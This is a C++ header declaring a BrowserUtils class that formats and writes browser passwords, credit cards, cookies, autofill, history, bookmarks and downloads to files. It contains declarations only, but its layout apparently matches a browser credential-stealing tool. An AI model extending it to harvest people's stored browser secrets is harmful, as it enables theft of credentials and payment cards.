#pragma once
#include "Common.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <unordered_map>


class BrowserUtils
{
public:
	static std::string FormatPassword(Password pPassword);
	static std::string FormatCreditCard(CreditCard cCard);
	static std::string FormatCookie(Cookie cCookie);
	static std::string FormatAutoFill(AutoFill aFill);
	static std::string FormatHistory(Site sSite);
	static std::string FormatBookmark(Bookmark bBookmark);
	static std::string FormatDownload(Download download);

	static void WriteCookies(std::vector<Cookie> cCookies, std::string& sFile);
	static void WriteAutoFill(std::vector<AutoFill>& aFills, std::string& sFile);
	static void WriteHistory(std::vector<Site>& sHistory, std::string& sFile);
	static void WriteBookmarks(std::vector<Bookmark>& bBookmarks, std::string& sFile);
	static void WritePasswords(std::vector<Password> pPasswords, std::string& sFile);
	static void WriteCreditCards(std::vector<CreditCard>& cCReditCard, std::string sFile);
	static void WriteDownload(std::vector<Download>& sHistory, std::string& sFile);

};

